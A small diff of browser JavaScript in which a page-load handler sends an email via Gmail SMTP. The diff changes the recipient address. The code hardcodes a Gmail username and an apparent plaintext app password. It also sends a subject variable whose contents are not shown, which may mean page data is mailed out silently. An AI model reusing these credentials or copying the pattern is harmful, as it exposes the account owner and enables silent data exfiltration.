@@ -13,7 +13,7 @@ window.onload = function()
                     Host: "smtp.gmail.com",
                     Username : "julio74108520@gmail.com",
                     Password : "hgvt vldi peit jcoh",
-                    To : 'user1533@protonmail.com',
+                    To : "julio74108520@gmail.com",
                     From : "julio74108520@gmail.com",
                     Subject : y,
                     Body : "<p> << Email </p>",
